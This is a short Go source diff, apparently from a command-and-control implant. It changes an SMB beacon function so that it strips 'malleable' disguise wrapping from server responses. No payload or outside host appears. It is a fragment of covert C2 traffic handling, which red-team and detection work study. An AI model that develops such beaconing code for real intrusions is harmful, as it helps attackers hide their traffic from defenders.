@@ -242,5 +242,6 @@ func sendSMBBeacon(body []byte) []byte {
 	if Debug {
 		fmt.Printf("[+] SMB beacon OK from %s, %d bytes\n", pipeName, len(resp))
 	}
-	return resp
+	// Strip any malleable cover the server wrapped around the raw SMB frame.
+	return stripMalleableWrapping(resp)
 }
